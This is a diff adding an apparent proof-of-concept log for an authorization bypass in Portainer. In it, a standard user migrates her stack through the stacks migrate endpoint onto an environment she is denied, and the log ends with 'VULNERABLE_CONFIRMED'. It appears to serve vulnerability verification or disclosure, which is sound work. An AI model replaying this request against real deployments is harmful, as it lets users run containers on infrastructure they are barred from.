@@ -1,0 +1,80 @@
+
+=== cleanup ===
+
+=== start two independent docker daemons + portainer ===
+
+=== wait for portainer ===
+{"Version":"2.45.0","InstanceID":"f723cb80-bec2-44ff-a048-f3e5e90a8914"}
+
+=== wait for dind daemons ===
+secres-env-a: dockerd 29.9.2
+secres-env-b: dockerd 29.9.2
+
+=== portainer admin init ===
+admin/init -> HTTP 200
+admin jwt: 296 bytes
+
+=== create environments ===
+env-a endpoint id = 1
+env-b endpoint id = 2
+
+=== create standard user alice ===
+alice user id = 2
+
+=== grant alice endpoint A only ===
+PUT endpoints/A -> 200
+
+=== A: regular users may manage stacks | B: they may not ===
+settings A -> 200
+settings B -> 200
+
+=== alice login ===
+alice jwt: 296 bytes
+
+=== alice's visible environments ===
+1	env-a
+
+=== CONTROL 1: alice GETs environment B directly ===
+HTTP 403  (expect 403)
+
+=== CONTROL 2: alice creates a stack directly on B ===
+HTTP 403  (expect 403)
+{"message":"Stack creation is disabled for non-admin users","details":"Stack creation is disabled for non-admin users"}
+
+=== CONTROL 3: alice lists containers on B through the Portainer Docker proxy ===
+HTTP 403  (expect 403)
+{"message":"Permission denied to access environment","details":"Access denied to environment"}
+
+=== BASELINE: alice creates a stack on A (her own environment) ===
+stack create response: {"Id":1,"Name":"probe-a","Type":2,"EndpointId":1,"SwarmId":"","EntryPoint":"docker-compose.yml","Env":[{"name":"SECRET_FROM_A","value":"should-not-be-on-b"}],"ResourceControl":{"Id":1,"ResourceId":"1_
+stack id = 1 on endpoint 1
+env-a containers after baseline:
+probe-a-p-1  alpine
+
+=== ATTACK: alice migrates stack 1 to environment B (2), which she cannot access ===
+POST /stacks/1/migrate {"EndpointID":2} -> HTTP 200
+{"Id":1,"Name":"probe-a","Type":2,"EndpointId":2,"SwarmId":"","EntryPoint":"docker-compose.yml","Env":[{"name":"SECRET_FROM_A","value":"should-not-be-on-b"}],"ResourceControl":null,"Status":1,"DeploymentStartStatus":0,"ProjectPath":"/data/compose/1","CreationDate":1793910443,"CreatedBy":"alice","UpdateDate":0,"UpdatedBy":"","AdditionalFiles":null,"AutoUpdate":null,"Option":null,"GitConfig":null,"F
+
+=== OBSERVE: containers on env-b (the environment alice has no access to) ===
+probe-a-p-1  alpine  Up 19 seconds
+-- env-b container count: 1
+
+=== CONTROL: the stack Env field is a Portainer deploy input, and does NOT silently become container env ===
+-- container env occurrences of SECRET_FROM_A: 0 (expect 0)
+-- (the SECRET_FROM_A value exists only in the Portainer stack record, shown below)
+
+=== OBSERVE: source environment after migration ===
+-- env-a container count: 0  (expect 0: stack moved off A)
+
+=== OBSERVE: container really came from alice's stack, not a coincidence ===
+-- env-b labels:
+probe-a / p
+
+=== OBSERVE: stack record after the attempt ===
+{"Id":1,"Name":"probe-a","EndpointId":2,"Env":[{"name":"SECRET_FROM_A","value":"should-not-be-on-b"}],"Status":1}
+
+=== RESULT ===
+VULNERABLE_CONFIRMED
+
+=== cleanup containers (keep network for inspection) ===
+done
